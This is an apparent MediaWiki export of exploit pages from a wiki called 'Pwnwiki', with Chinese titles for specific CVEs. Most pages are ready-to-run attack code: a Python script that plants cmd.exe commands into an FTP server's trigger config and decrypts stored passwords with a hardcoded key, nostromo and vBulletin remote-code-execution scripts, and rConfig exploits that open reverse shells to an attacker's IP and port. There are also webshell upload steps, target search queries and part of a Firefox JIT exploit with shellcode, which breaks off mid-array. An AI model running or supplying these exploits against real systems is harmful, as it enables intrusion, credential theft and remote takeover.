      &lt;ClassName&gt;EnterpriseDT.Net.FtpServer.Trigger.ProcessTrigger&lt;/ClassName&gt;
      &lt;PlugInTypeID&gt;2&lt;/PlugInTypeID&gt;
      &lt;Configuration&gt;&lt;/Configuration&gt;
      &lt;CreatedTime&gt;2020-03-10T18:33:41.107+08:00&lt;/CreatedTime&gt;
      &lt;ModifiedTime&gt;2020-03-10T10:50:44.4209655+08:00&lt;/ModifiedTime&gt;
      &lt;UserInstance&gt;false&lt;/UserInstance&gt;
      &lt;System&gt;true&lt;/System&gt;
      &lt;ChangeSetID&gt;&lt;/ChangeSetID&gt;
    &lt;/PlugIn&gt;
  &lt;/diffgr:before&gt;
&lt;/diffgr:diffgram&gt;
""".strip()
# endregion

# region config
config = """
&lt;TriggerDataSet xmlns="http://tempuri.org/TriggerDataSet.xsd"&gt;
    &lt;ProcessConfig&gt;
        &lt;ProcessConfigID&gt;0&lt;/ProcessConfigID&gt;
        &lt;MaxProcesses&gt;10&lt;/MaxProcesses&gt;
        &lt;RunTimeout&gt;0&lt;/RunTimeout&gt;
        &lt;QueueTimeout&gt;0&lt;/QueueTimeout&gt;
        &lt;KillOnExit&gt;true&lt;/KillOnExit&gt;
    &lt;/ProcessConfig&gt;
    &lt;ProcessRule&gt;
        &lt;ProcessRuleID&gt;1&lt;/ProcessRuleID&gt;
        &lt;ProcessConfigID&gt;0&lt;/ProcessConfigID&gt;
        &lt;Name&gt;trigger&lt;/Name&gt;
        &lt;Enabled&gt;true&lt;/Enabled&gt;
        &lt;ProcessType&gt;0&lt;/ProcessType&gt;
        &lt;ProcessPath&gt;cmd.exe&lt;/ProcessPath&gt;
        &lt;Arguments&gt;/c {CMD}&lt;/Arguments&gt;
        &lt;PathFilter&gt;*&lt;/PathFilter&gt;
        &lt;OnError&gt;false&lt;/OnError&gt;
        &lt;OnSuccess&gt;true&lt;/OnSuccess&gt;
        &lt;RowOrder&gt;1&lt;/RowOrder&gt;
    &lt;/ProcessRule&gt;
    &lt;ProcessEvent&gt;
        &lt;ProcessRuleID&gt;1&lt;/ProcessRuleID&gt;
        &lt;EventType&gt;LogIn&lt;/EventType&gt;
    &lt;/ProcessEvent&gt;
&lt;/TriggerDataSet&gt;
""".strip()
# endregion

def prepare_update_config(uuid, cmd):
    config_payload = config
    config_payload = config_payload.replace('{CMD}', cmd)
    config_payload = config_payload.replace('&lt;', '&lt;')
    config_payload = config_payload.replace('&gt;', '&gt;')

    diffgram_payload = xml_diffgram
    diffgram_payload = diffgram_payload.replace('{CONFIGURATION}', config_payload)
    diffgram_payload = diffgram_payload.replace('{ID}', uuid)
    diffgram_payload = diffgram_payload.replace('&amp;', '&amp;')
    diffgram_payload = diffgram_payload.replace('&lt;', '&lt;')
    diffgram_payload = diffgram_payload.replace('&gt;', '&gt;')
    diffgram_payload = diffgram_payload.replace('"', '"')

    payload = update_config
    payload = payload.replace('{XMLSCHEMA}', xml_schema)
    payload = payload.replace('{XMLDIFFGRAM}', diffgram_payload)

    return payload

def send_request(sftp, payload):
    payload = b64encode(bytes(payload, 'utf-8')).decode('utf-8')
    res = sftp._request(CMD_EXTENDED, 'admin@enterprisedt.com', 'SOAP64 ' + payload)
    return res

def convert_changeset_id_to_uuid(changeset_id):
    a = struct.pack('i', int(changeset_id[0].text))  # 32
    b = struct.pack('h', int(changeset_id[1].text))  # 16
    c = struct.pack('h', int(changeset_id[2].text))  # 16
    d = struct.pack('B', int(changeset_id[3].text))  # 8
    e = struct.pack('B', int(changeset_id[4].text))  # 8
    f = struct.pack('B', int(changeset_id[5].text))  # 8
    g = struct.pack('B', int(changeset_id[6].text))  # 8
    h = struct.pack('B', int(changeset_id[7].text))  # 8
    i = struct.pack('B', int(changeset_id[8].text))  # 8
    j = struct.pack('B', int(changeset_id[9].text))  # 8
    k = struct.pack('B', int(changeset_id[10].text)) # 8

    x = a + b + c + d + e + f + g + h + i + j + k
    return uuid.UUID(bytes_le=x)

def get_uuid(sftp):
    res = send_request(sftp, get_server_info)
    if res[0] != 201:
        print('[!] Error could not request server info via SFTP')
        sys.exit(1)
    
    res = b64decode(res[1].get_string()).decode('utf-8')
    res = ET.fromstring(res)
    changeset_id = res.find('.//SyncChangeSetID')
    uuid = convert_changeset_id_to_uuid(changeset_id)
    return str(uuid)

def login(host, port, user, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(host, port, user, password, look_for_keys=False)
    return ssh.open_sftp()

def send_command(sftp, cmd):
    uuid = get_uuid(sftp)
    payload = prepare_update_config(uuid, cmd)
    res = send_request(sftp, payload)
    if res[0] != 201:
        print('[!] Error could not send update config request via SFTP')
        sys.exit(1)

def decrypt_password(password):
  key = b64decode('HKVV76GdVuzXne/zxtWvdjA2d2Am548E')
  iv = b64decode('gVGow/9uLvM=')
  encrypted = b64decode(password)
  cipher = DES3.new(key=key, iv=iv, mode=DES3.MODE_CBC)
  decrypted = cipher.decrypt(encrypted)
  return unpad(decrypted, 8).decode('utf-16')

if len(sys.argv) != 6:
    print('[!] Missing arguments')
    print('[ ] Usage: {} &lt;target&gt; &lt;port&gt; &lt;username&gt; &lt;encrypted-password&gt; &lt;cmd&gt;'.format(sys.argv[0]))
    print("[ ] E.g. {} 192.168.1.128 14983 admin DEomw27OY7sYZs4XjYA2kVB4LEB5skN4 'whoami &gt; C:\\x.txt'".format(sys.argv[0]))
    sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])
username = sys.argv[3]
password = sys.argv[4]
cmd = sys.argv[5]

print('[ ] Decrypting password')
password = decrypt_password(password)
print('[ ] Decrypted password is "{}"'.format(password))

print('[ ] Logging in')
sftp = login(target, port, username, password)

print('[ ] Sending command')
send_command(sftp, cmd)

print('[ ] Command successfully sent, triggering...')
sftp = login(target, port, username, password)
&lt;/pre&gt;</text>
      <sha1>i7r0at2nqsujbuv8cbcmx6owxklu2c6</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-16131 OKLite v1.2.25 任意文件上傳漏洞</title>
    <ns>0</ns>
    <id>1573</id>
    <revision>
      <id>1969</id>
      <timestamp>2021-05-01T01:26:20Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==版本== OKLite v1.2.25  ==漏洞利用== 登錄後台，點擊模塊管理  編輯一個測試文件test.php,壓縮為test.zip上傳。  然後導入模塊  點擊開始上..."</comment>
      <origin>1969</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="291" sha1="hklkvaydigj1hxg2urnl3bhwn4glmib" xml:space="preserve">==版本==
OKLite v1.2.25

==漏洞利用==
登錄後台，點擊模塊管理

編輯一個測試文件test.php,壓縮為test.zip上傳。

然後導入模塊

點擊開始上傳，上傳shell生成在解壓主目錄下面

訪問&lt;code&gt;http://127.0.0.1:8888/1.2.25/data/cache/test.php&lt;/code&gt;</text>
      <sha1>hklkvaydigj1hxg2urnl3bhwn4glmib</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-16132 OKLite v1.2.25 任意文件刪除漏洞</title>
    <ns>0</ns>
    <id>1574</id>
    <revision>
      <id>1970</id>
      <timestamp>2021-05-01T01:27:57Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==版本== OKLite v1.2.25  ==前提條件== 需要登錄後臺面板  ==漏洞利用== 在主目錄下創建一個index.txt用來測試  登錄後台，在設置-&gt;風格管理..."</comment>
      <origin>1970</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="338" sha1="sfbg6722df5iipp002nvd664yufx4ap" xml:space="preserve">==版本==
OKLite v1.2.25

==前提條件==
需要登錄後臺面板

==漏洞利用==
在主目錄下創建一個index.txt用來測試

登錄後台，在設置-&gt;風格管理

點擊文件管理

隨便刪除一個文件，點擊抓包，修改title參數為&lt;code&gt;../../test.txt&lt;/code&gt;

發送請求，主目錄下的test.txt已被刪除</text>
      <sha1>sfbg6722df5iipp002nvd664yufx4ap</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-16278 nostromo 1.9.6 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1018</id>
    <revision>
      <id>1292</id>
      <timestamp>2021-04-09T02:49:48Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: nostromo 1.9.6 - Remote Code Execution # Date: 2019-12-31 # Exploit Author: Kr0ff # Vendor Homepage: # Software Link: http://www.nazgul.ch/dev/n..."</comment>
      <origin>1292</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1785" sha1="51hd6814vxfpdg4cqm17ufqz29azh2r" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: nostromo 1.9.6 - Remote Code Execution
# Date: 2019-12-31
# Exploit Author: Kr0ff
# Vendor Homepage:
# Software Link: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz
# Version: 1.9.6
# Tested on: Debian
# CVE : CVE-2019-16278

cve2019_16278.py

#!/usr/bin/env python

import sys
import socket

art = """

                                        _____-2019-16278
        _____  _______    ______   _____\    \   
   _____\    \_\      |  |      | /    / |    |  
  /     /|     ||     /  /     /|/    /  /___/|  
 /     / /____/||\    \  \    |/|    |__ |___|/  
|     | |____|/ \ \    \ |    | |       \        
|     |  _____   \|     \|    | |     __/ __     
|\     \|\    \   |\         /| |\    \  /  \    
| \_____\|    |   | \_______/ | | \____\/    |   
| |     /____/|    \ |     | /  | |    |____/|   
 \|_____|    ||     \|_____|/    \|____|   | |   
        |____|/                        |___|/    



"""

help_menu = '\r\nUsage: cve2019-16278.py &lt;Target_IP&gt; &lt;Target_Port&gt; &lt;Command&gt;'

def connect(soc):
    response = ""
    try:
        while True:
            connection = soc.recv(1024)
            if len(connection) == 0:
                break
            response += connection
    except:
        pass
    return response

def cve(target, port, cmd):
    soc = socket.socket()
    soc.connect((target, int(port)))
    payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2&gt;&amp;1'.format(cmd)
    soc.send(payload)
    receive = connect(soc)
    print(receive)

if __name__ == "__main__":

    print(art)
    
    try:
        target = sys.argv[1]
        port = sys.argv[2]
        cmd = sys.argv[3]

        cve(target, port, cmd)
   
    except IndexError:
        print(help_menu)
&lt;/pre&gt;</text>
      <sha1>51hd6814vxfpdg4cqm17ufqz29azh2r</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-16313 蜂網互聯 企業級路由器v4.31 密碼洩露漏洞</title>
    <ns>0</ns>
    <id>284</id>
    <revision>
      <id>437</id>
      <timestamp>2021-03-19T01:38:02Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==FOFA== &lt;pre&gt; app="蜂网互联-互联企业级路由器" &lt;/pre&gt;  ==POC== &lt;pre&gt; import requests import sys import random import re from requests.packages.urllib3.exceptions i..."</comment>
      <origin>437</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1820" sha1="4fnf47jcll0ts34smepnani7obaahoy" xml:space="preserve">==FOFA==
&lt;pre&gt;
app="蜂网互联-互联企业级路由器"
&lt;/pre&gt;

==POC==
&lt;pre&gt;
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mVersion: DrayTek企业网络设备                                        \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/action/usermanager.htm"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        print("\033[32m[o] 正在请求 {}/action/usermanager.htm \033[0m".format(target_url))
        if "pwd" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 \033[0m".format(target_url))
            print("\033[32m[o] 响应为:\n{} \033[0m".format(response.text))
        else:
            print("\033[31m[x] 不存在漏洞 \033[0m")
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)
        sys.exit(0)



if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    POC_1(target_url)
&lt;/pre&gt;</text>
      <sha1>4fnf47jcll0ts34smepnani7obaahoy</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-16314 indexhibit cms v2.1.5 重裝&amp;Getshell漏洞</title>
    <ns>0</ns>
    <id>1370</id>
    <revision>
      <id>1728</id>
      <timestamp>2021-04-18T08:57:55Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; /ndxzstudio/install.php?p=2 &lt;/pre&gt;"</comment>
      <origin>1728</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="48" sha1="56l97u44or4bxb9v3j6x4tca6ngg32b" xml:space="preserve">==POC==
&lt;pre&gt;
/ndxzstudio/install.php?p=2
&lt;/pre&gt;</text>
      <sha1>56l97u44or4bxb9v3j6x4tca6ngg32b</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-16662 rConfig 遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>2044</id>
    <revision>
      <id>2469</id>
      <timestamp>2021-05-05T06:43:11Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC1== &lt;pre&gt; #!/usr/bin/python  # Exploit Title: rConfig v3.9.2 unauthenticated Remote Code Execution # Date: 18/09/2019 # Exploit Author: Askar (@mohammadaskar2) # CVE : CV..."</comment>
      <origin>2469</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2927" sha1="7u9yae5av05vtjlbppulxpfqj8nq0d0" xml:space="preserve">==POC1==
&lt;pre&gt;
#!/usr/bin/python

# Exploit Title: rConfig v3.9.2 unauthenticated Remote Code Execution
# Date: 18/09/2019
# Exploit Author: Askar (@mohammadaskar2)
# CVE : CVE-2019-16662
# Vendor Homepage: https://rconfig.com/
# Software link: https://rconfig.com/download
# Version: v3.9.2
# Tested on: CentOS 7.7 / PHP 7.2.22

import requests
import sys
from urllib import quote
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

if len(sys.argv) != 4:
    print "[+] Usage : ./exploit.py target ip port"
    exit()

target = sys.argv[1]

ip = sys.argv[2]

port = sys.argv[3]

payload = quote(''';php -r '$sock=fsockopen("{0}",{1});exec("/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3");'#'''.format(ip, port))

install_path = target + "/install"

req = requests.get(install_path, verify=False)
if req.status_code == 404:
    print "[-] Installation directory not found!"
    print "[-] Exploitation failed !"
    exit()
elif req.status_code == 200:
    print "[+] Installation directory found!"
url_to_send = target + "/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=" + payload

print "[+] Triggering the payload"
print "[+] Check your listener !"

requests.get(url_to_send, verify=False)
&lt;/pre&gt;


==POC2==
&lt;pre&gt;
#!/usr/bin/python

# Exploit Title: rConfig v3.9.2 Authenticated Remote Code Execution
# Date: 18/09/2019
# Exploit Author: Askar (@mohammadaskar2)
# CVE : CVE-2019-16663
# Vendor Homepage: https://rconfig.com/
# Software link: https://rconfig.com/download
# Version: v3.9.2
# Tested on: CentOS 7.7 / PHP 7.2.22


import requests
import sys
from urllib import quote
from requests.packages.urllib3.exceptions import InsecureRequestWarning


requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

if len(sys.argv) != 6:
    print "[+] Usage : ./exploit.py target username password ip port"
    exit()

target = sys.argv[1]

username = sys.argv[2]

password = sys.argv[3]

ip = sys.argv[4]

port = sys.argv[5]

request = requests.session()

login_info = {
    "user": username,
    "pass": password,
    "sublogin": 1
}

login_request = request.post(
    target+"/lib/crud/userprocess.php",
     login_info,
     verify=False,
     allow_redirects=True
 )

dashboard_request = request.get(target+"/dashboard.php", allow_redirects=False)


if dashboard_request.status_code == 200:
    print "[+] LoggedIn successfully"
    payload = '''""&amp;amp;&amp;amp;php -r '$sock=fsockopen("{0}",{1});exec("/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3");'#'''.format(ip, port)
    encoded_request = target+"/lib/crud/search.crud.php?searchTerm=anything&amp;amp;catCommand={0}".format(quote(payload))
    print "[+] triggering the payload"
    print "[+] Check your listener !"
    exploit_req = request.get(encoded_request)

elif dashboard_request.status_code == 302:
    print "[-] Wrong credentials !"
    exit()
&lt;/pre&gt;</text>
      <sha1>7u9yae5av05vtjlbppulxpfqj8nq0d0</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-16759 vBulletin 5.x RCE漏洞</title>
    <ns>0</ns>
    <id>1334</id>
    <revision>
      <id>1674</id>
      <timestamp>2021-04-15T05:35:48Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; #!/usr/bin/python # # vBulletin 5.x 0day pre-auth RCE exploit #  # This should work on all versions from 5.0.0 till 5.5.4 # # Google Dorks: # - site:*.vbulletin...."</comment>
      <origin>1674</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1067" sha1="asivuuotr46cgllkxf0u2rgkmb2x2db" xml:space="preserve">==POC==
&lt;pre&gt;
#!/usr/bin/python
#
# vBulletin 5.x 0day pre-auth RCE exploit
# 
# This should work on all versions from 5.0.0 till 5.5.4
#
# Google Dorks:
# - site:*.vbulletin.net
# - "Powered by vBulletin Version 5.5.4"

import requests
import sys

if len(sys.argv) != 2:
    sys.exit("Usage: %s &lt;URL to vBulletin&gt;" % sys.argv[0])

proxies ={
     "http":"http://127.0.0.1:8080/"
}
params = {"routestring":"ajax/render/widget_php"}

while True:
     try:
          cmd = raw_input("&gt;&gt;&gt;Shell= ")
          params["widgetConfig[code]"] = "echo shell_exec('"+cmd+"');echo md5('vBulletin'); exit;"
          r = requests.post(url = sys.argv[1], data = params, proxies=proxies)
          if r.status_code == 200 or r.status_code ==403 and 'be4ea51d962be8308a0099ae1eb3ec63' in r.text:
               print
               print r.text.split('be4ea51d962be8308a0099ae1eb3ec63')[0]
          else:
               sys.exit("Exploit failed! :(")
     except KeyboardInterrupt:
          sys.exit("\nClosing shell...")
     except Exception, e:
          sys.exit(str(e))
&lt;/pre&gt;</text>
      <sha1>asivuuotr46cgllkxf0u2rgkmb2x2db</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-17026 Firefox 72 IonMonkey JIT類型混淆漏洞</title>
    <ns>0</ns>
    <id>2365</id>
    <revision>
      <id>2847</id>
      <timestamp>2021-05-13T09:29:07Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Firefox 72 IonMonkey - JIT Type Confusion # Date: 2021-05-10 # Exploit Author: deadlock (Forrest Orr) # Vendor Homepage: https://www.mozilla.org..."</comment>
      <origin>2847</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="43733" sha1="9wrqcwwkiuetku68k35oyuzzu93f8bb" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Firefox 72 IonMonkey - JIT Type Confusion
# Date: 2021-05-10
# Exploit Author: deadlock (Forrest Orr)
# Vendor Homepage: https://www.mozilla.org/en-US/
# Software Link: https://www.mozilla.org/en-US/firefox/new/
# Versions: Firefox &lt; 72 64-bit
# Tested on: Windows 7 x64, Windows 8.1 x64, Windows 10 x64
# CVE: CVE-2019-17026
# Bypasses: DEP, ASLR, CFG, sandboxing
# Credits: maxpl0it, 0vercl0k
# Full explain chain writeup: https://github.com/forrest-orr/DoubleStar

/*
________                 ___.    .__                 _________  __
\______ \    ____   __ __\_ |__  |  |    ____       /   _____/_/  |_ _____  _______
 |    |  \  /  _ \ |  |  \| __ \ |  |  _/ __ \      \_____  \ \   __\\__  \ \_  __ \
 |    `   \(  &lt;_&gt; )|  |  /| \_\ \|  |__\  ___/      /        \ |  |   / __ \_|  | \/
/_______  / \____/ |____/ |___  /|____/ \___  &gt;    /_______  / |__|  (____  /|__|
        \/                    \/            \/             \/             \/
Windows 8.1 IE/Firefox RCE -&gt; Sandbox Escape -&gt; SYSTEM EoP Exploit Chain

                            ______________
                            | Remote PAC | 
                            |____________|  
                                   ^
                                   | HTTPS
_______________  RPC/ALPC   _______________   RPC/ALPC   _______________
| firefox.exe | ----------&gt; | svchost.exe | -----------&gt; | spoolsv.exe |
|_____________|             |_____________| &lt;----------- |_____________|
                                   |          RPC/Pipe
                                   |
               _______________     | 
               | malware.exe | &lt;---| Execute impersonating NT AUTHORY\SYSTEM
               |_____________|

~

Component

Firefox 64-bit IonMonkey JIT/Type Confusion RCE. Represents the initial attack
vector when a user visits an infected web page with a vulnerable version of
Firefox. This component contains a stage one (egg hunter) and stage two (WPAD
sandbox escape) shellcode, the latter of which is only effective on Windows 8.1
due to hardcoded RPC IDL interface details for WPAD.


_______________  JIT spray   ______________  DEP bypass   _______________________
| firefox.exe | -----------&gt; | Egg hunter | ------------&gt; | WPAD sandbox escape |
|_____________|              | shellcode  |               | shellcode (heap)    |
                             |____________|               |_____________________|                                                                    

~

Overview

This is a Windows variation of CVE-2019-17026, an exploit targetting a type
confusion bug in the IonMonkey engine of Firefox up to FF 72. Due to specific
issues with heap grooming, this particular variant of CVE-2019-17026 only works
on versions of Firefox up to FF 69 even though the bug was not fixed until FF
72 and is still technically exploitable on FF 70 and 71.

CVE-2019-17026 represents the initial RCE vector in the Double Star exploit
chain. Unlike my re-creation of CVE-2020-0674, which is limited to efficacy
in IE/WPAD instances running within Windows 7 and 8.1 (with Windows 10 CFG and
WPAD sandboxing being beyond the scope of this project in complexity to bypass)
this particular exploit is effective on any version of Windows, including 10
provided that a vulnerable version of Firefox is installed. The reason for this
is that presence of (and exploit usage of) a JIT engine in this exploit makes
dealing with both DEP and CFG substantially easier.

~

Design

This exploit contains two shellcodes: an egg hunter/DEP bypass shellcode (which
is JIT sprayed) and a primary (stage two) shellcode stored as a static Uint8Array.
The stage one (egg hunter) shellcode is responsible for scanning the entire
memory space of the current firefox.exe process and finding the stage two
shellcode on the heap. This is achieved by prefixing the stage two shellcode
with a special 64-bit egg value which this egg hunter shellcode scans for. Once
it has found the stage two shellcode, it uses KERNEL32.DLL!VirtualProtect to
change its permissions to +RWX, and then directly executes it via a CALL
instruction.

The type confusion bug allows for an array boundscheck to be eliminated, thus
allowing for an OOB R/W via a glitched array. The nursery heap (where the array
is stored) is groomed so that 3 arrays are lined up in memory:

[Array 1][Array 2][Array 3]

The first array is used with the JIT bug to make an OOB write and corrupt the
metadata of the second array. Specifically, it corrupts its length to allow for
OOB R/W at will (without the JIT bug) which is subsequently used throughout
the remainer of the exploit to corrupt the Native Object structure of the third
array to build arbitrary R/W and AddressOf primitives.

A JIT spray is then used to spray an egg hunter shellcode (encoded as double
floats) into +RX memory, encapsulated in a do-nothing function. The JIT code
pointer of this function is leaked and subsequently used with an egg hunter
in the JS itself (using arbitrary read) to find the egg which marks the 
start of the egg hunter shellcode in +RX memory. In this sense, the exploit
contains 2 egg hunters: a JS egg hunter which searches for a JIT sprayed egg
hunter which in turn hunts for the full (stage two) WPAD sandbox escape
shellcode. Once the JIT sprayed (stage one) egg hunter shellcode finds the stage
two shellcode, it sets its memory region to +RWX and directly executes it.

~

Sandboxing

The Firefox sandbox prevents access to the filesystem (besides a special sandbox
temp directory) and registry but additionally (unlike IE11 on Windows 8.1) locks
down access to the desktop window session (which prevents even a MessageBoxA
from popping) and sets a child process creation quota of zero (preventing the
creation of child processes). By adjusting the sandbox content level in the FF
"about:config" settings some of these features can be disabled for testing
purposes. For example, setting the content level down from "5" (the default) to
"2" will allow MessageBoxA to pop as well as child process creation, however even
when the content level is set down to "0" there are certain protections which will
persist (such as inability to access the file system). 

One vector however which is not guarded by the sandbox is access to ALPC port
objects, which can be used to initiate connections to LocalServer32 COM servers
running in external (and potentially non-sandboxed or elevated) processes. This
detail is exploited by this chain by utilizing a stage two shellcode which
initiates an RPC (ALPC) connection to the WPAD service and triggers it to
download and execute a PAC file from a remote URL containing CVE-2020-0674 into
its own process (svchost.exe running as LOCAL SERVICE). In this way, the sandbox
can be escaped via RPC/ALPC and simultaneously elevated from the current user
session (which may have limited/non-administrator privileges) into a sensitive
service process.

~

Credits

maxpl0it  - for writing the initial analysis and PoC for CVE-2019-17026 with a
            focus on the Linux OS.
            
0vercl0k  - for documenting IonMonkey internals in relation to aliasing and
            the GVN.

*/

////////
////////
// Global helpers/settings
////////

// Carefully read the overview comments of this exploit source. This is a simple MessageBoxA shellcode but due to sandboxing will not appear without the steps I outlined. To see the full Double Star exploit chain which can bypass the sandbox in full, read my research on it at: https://github.com/forrest-orr/DoubleStar
const Shellcode = new Uint8Array([ 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x48, 0x83, 0xec, 0x08, 0x40, 0x80, 0xe4, 0xf7, 0x48, 0xc7, 0xc1, 0x88, 0x4e, 0x0d, 0x00, 0xe8, 0x91, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc7, 0x48, 0xc7, 0xc2, 0x86, 0x57, 0x0d, 0x00, 0x48, 0x89, 0xf9, 0xe8, 0xde, 0x00, 0x00, 0x00, 0x48, 0xb9, 0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x00, 0x00, 0x51, 0x48, 0x89, 0xe1, 0x55, 0x48, 0x89, 0xe5, 0x48, 0x83, 0xec, 0x20, 0x48, 0x83, 0xec, 0x08, 0x40, 0x80, 0xe4, 0xf7, 0xff, 0xd0, 0x48, 0x89, 0xec, 0x5d, 0x48, 0xc7, 0xc2, 0x1a, 0xb8, 0x06, 0x00, 0x48, 0x89, 0xc1, 0xe8, 0xab, 0x00, 0x00, 0x00, 0x4d, 0x31, 0xc9, 0x48, 0xb9, 0x70, 0x77, 0x6e, 0x65, 0x64, 0x00, 0x00, 0x00, 0x51, 0x49, 0x89, 0xe0, 0x48, 0xc7, 0xc1, 0x6e, 0x65, 0x74, 0x00, 0x51, 0x48, 0xb9, 0x65, 0x73, 0x74, 0x2d, 0x6f, 0x72, 0x72, 0x2e, 0x51, 0x48, 0xb9, 0x77, 0x77, 0x77, 0x2e, 0x66, 0x6f, 0x72, 0x72, 0x51, 0x48, 0x89, 0xe2, 0x48, 0x31, 0xc9, 0x55, 0x48, 0x89, 0xe5, 0x48, 0x83, 0xec, 0x20, 0x48, 0x83, 0xec, 0x08, 0x40, 0x80, 0xe4, 0xf7, 0xff, 0xd0, 0x48, 0x89, 0xec, 0x5d, 0xc3, 0x41, 0x50, 0x57, 0x56, 0x49, 0x89, 0xc8, 0x48, 0xc7, 0xc6, 0x60, 0x00, 0x00, 0x00, 0x65, 0x48, 0xad, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x8b, 0x78, 0x30, 0x48, 0x89, 0xfe, 0x48, 0x31, 0xc0, 0xeb, 0x05, 0x48, 0x39, 0xf7, 0x74, 0x34, 0x48, 0x85, 0xf6, 0x74, 0x2f, 0x48, 0x8d, 0x5e, 0x38, 0x48, 0x85, 0xdb, 0x74, 0x1a, 0x48, 0xc7, 0xc2, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x4b, 0x08, 0x48, 0x85, 0xc9, 0x74, 0x0a, 0xe8, 0xa7, 0x01, 0x00, 0x00, 0x4c, 0x39, 0xc0, 0x74, 0x08, 0x48, 0x31, 0xc0, 0x48, 0x8b, 0x36, 0xeb, 0xcb, 0x48, 0x8b, 0x46, 0x10, 0x5e, 0x5f, 0x41, 0x58, 0xc3, 0x55, 0x48, 0x89, 0xe5, 0x48, 0x81, 0xec, 0x50, 0x02, 0x00, 0x00, 0x57, 0x56, 0x48, 0x89, 0x4d, 0xf8, 0x48, 0x89, 0x55, 0xf0, 0x48, 0x31, 0xdb, 0x8b, 0x59, 0x3c, 0x48, 0x01, 0xd9, 0x48, 0x83, 0xc1, 0x18, 0x48, 0x8b, 0x75, 0xf8, 0x48, 0x31, 0xdb, 0x8b, 0x59, 0x70, 0x48, 0x01, 0xde, 0x48, 0x89, 0x75, 0xe8, 0x8b, 0x41, 0x74, 0x89, 0x45, 0xc0, 0x48, 0x8b, 0x45, 0xf8, 0x8b, 0x5e, 0x20, 0x48, 0x01, 0xd8, 0x48, 0x89, 0x45, 0xe0, 0x48, 0x8b, 0x45, 0xf8, 0x48, 0x31, 0xdb, 0x8b, 0x5e, 0x24, 0x48, 0x01, 0xd8, 0x48, 0x89, 0x45, 0xd8, 0x48, 0x8b, 0x45, 0xf8, 0x8b, 0x5e, 0x1c, 0x48, 0x01, 0xd8, 0x48, 0x89, 0x45, 0xd0, 0x48, 0x31, 0xf6, 0x48, 0x89, 0x75, 0xc8, 0x48, 0x8b, 0x45, 0xe8, 0x8b, 0x40, 0x18, 0x48, 0x39, 0xf0, 0x0f, 0x86, 0x09, 0x01, 0x00, 0x00, 